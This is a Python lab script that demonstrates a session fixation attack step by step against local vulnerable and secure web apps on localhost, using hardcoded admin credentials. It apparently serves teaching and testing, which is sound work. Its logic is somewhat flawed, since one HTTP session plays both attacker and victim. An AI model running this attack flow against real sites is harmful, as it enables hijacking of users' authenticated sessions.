#!/usr/bin/env python3
"""
Session Fixation Attack Demonstration
This tool properly demonstrates the session fixation vulnerability.
"""

import requests
from urllib.parse import urljoin
import time

class SessionFixationDemo:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def step1_attacker_captures_session(self):
        """Step 1: Attacker visits login page and captures session ID."""
        print("🎯 STEP 1: Attacker captures session ID")
        print("=" * 50)
        
        # Attacker visits login page
        response = self.session.get(urljoin(self.base_url, '/login'))
        
        print(f"Attacker visits: {response.url}")
        print(f"Status: {response.status_code}")
        
        # Get session cookie
        session_cookies = [name for name in self.session.cookies.keys() if 'session' in name.lower()]
        if session_cookies:
            session_id = self.session.cookies[session_cookies[0]]
            print(f"🎯 Attacker captured session ID: {session_id}")
            return session_id
        else:
            print("❌ No session cookie found")
            return None
    
    def step2_attacker_sends_link_to_victim(self, session_id):
        """Step 2: Attacker sends malicious link to victim."""
        print(f"\n🎯 STEP 2: Attacker sends malicious link to victim")
        print("=" * 50)
        
        malicious_url = f"{self.base_url}/login?session_id={session_id}"
        print(f"📧 Attacker sends this link to victim:")
        print(f"   {malicious_url}")
        print(f"📝 Victim clicks the link and gets the same session ID")
        
        return malicious_url
    
    def step3_victim_uses_attacker_session(self, malicious_url):
        """Step 3: Victim visits the malicious link."""
        print(f"\n🎯 STEP 3: Victim visits malicious link")
        print("=" * 50)
        
        # Victim visits the malicious link
        response = self.session.get(malicious_url)
        
        print(f"Victim visits: {response.url}")
        print(f"Status: {response.status_code}")
        
        # Check if session ID is the same
        session_cookies = [name for name in self.session.cookies.keys() if 'session' in name.lower()]
        if session_cookies:
            session_id = self.session.cookies[session_cookies[0]]
            print(f"🎯 Victim now has session ID: {session_id}")
            return session_id
        else:
            print("❌ No session cookie found")
            return None
    
    def step4_victim_logs_in(self, username, password):
        """Step 4: Victim logs in with attacker's session ID."""
        print(f"\n🎯 STEP 4: Victim logs in with attacker's session")
        print("=" * 50)
        
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(
            urljoin(self.base_url, '/login'),
            data=login_data,
            allow_redirects=True
        )
        
        print(f"Victim logs in as: {username}")
        print(f"Status: {response.status_code}")
        print(f"Final URL: {response.url}")
        
        # Check session ID after login
        session_cookies = [name for name in self.session.cookies.keys() if 'session' in name.lower()]
        if session_cookies:
            session_id = self.session.cookies[session_cookies[0]]
            print(f"🎯 Session ID after login: {session_id}")
            return session_id
        else:
            print("❌ No session cookie after login")
            return None
    
    def step5_attacker_accesses_victim_session(self, original_session_id):
        """Step 5: Attacker can now access victim's authenticated session."""
        print(f"\n🎯 STEP 5: Attacker accesses victim's session")
        print("=" * 50)
        
        # Attacker uses the same session ID to access dashboard
        response = self.session.get(urljoin(self.base_url, '/dashboard'))
        
        print(f"Attacker accesses dashboard: {response.url}")
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ SUCCESS: Attacker can access victim's authenticated session!")
            print("🚨 VULNERABILITY CONFIRMED: Session fixation attack successful!")
            
            # Extract user info from response
            if 'Welcome' in response.text:
                print("✅ Attacker can see victim's dashboard")
            else:
                print("❌ Dashboard access failed")
        else:
            print("❌ Attacker cannot access victim's session")
    
    def demonstrate_attack(self):
        """Demonstrate the complete session fixation attack."""
        print("🚨 SESSION FIXATION ATTACK DEMONSTRATION")
        print("=" * 60)
        print("This demonstrates how an attacker can hijack a user's session")
        print("by setting the session ID before the user logs in.")
        print()
        
        # Step 1: Attacker captures session
        original_session_id = self.step1_attacker_captures_session()
        if not original_session_id:
            print("❌ Cannot proceed without session ID")
            return
        
        # Step 2: Attacker sends malicious link
        malicious_url = self.step2_attacker_sends_link_to_victim(original_session_id)
        
        # Step 3: Victim visits malicious link
        victim_session_id = self.step3_victim_uses_attacker_session(malicious_url)
        if not victim_session_id:
            print("❌ Victim did not get session ID")
            return
        
        # Step 4: Victim logs in
        login_session_id = self.step4_victim_logs_in('admin', 'admin123')
        if not login_session_id:
            print("❌ Login failed")
            return
        
        # Step 5: Attacker accesses victim's session
        self.step5_attacker_accesses_victim_session(original_session_id)
        
        # Analysis
        print(f"\n🔍 ATTACK ANALYSIS")
        print("=" * 30)
        print(f"Original session ID: {original_session_id}")
        print(f"Session ID after login: {login_session_id}")
        
        if original_session_id == login_session_id:
            print("🚨 VULNERABILITY: Session ID unchanged after login!")
            print("✅ Session fixation attack successful!")
        else:
            print("✅ SECURE: Session ID changed after login")
            print("✅ Session fixation attack prevented!")

def main():
    print("🍪 Session Fixation Attack Demo")
    print("=" * 60)
    
    # Test vulnerable app
    print("\n1. Testing VULNERABLE app (port 5000)")
    vulnerable_demo = SessionFixationDemo("http://localhost:5000")
    
    try:
        vulnerable_demo.demonstrate_attack()
    except Exception as e:
        print(f"Error testing vulnerable app: {e}")
        print("Make sure vulnerable_app.py is running on port 5000")
    
    print("\n" + "=" * 60)
    
    # Test secure app
    print("\n2. Testing SECURE app (port 5001)")
    secure_demo = SessionFixationDemo("http://localhost:5001")
    
    try:
        secure_demo.demonstrate_attack()
    except Exception as e:
        print(f"Error testing secure app: {e}")
        print("Make sure secure_app.py is running on port 5001")

if __name__ == '__main__':
    main() 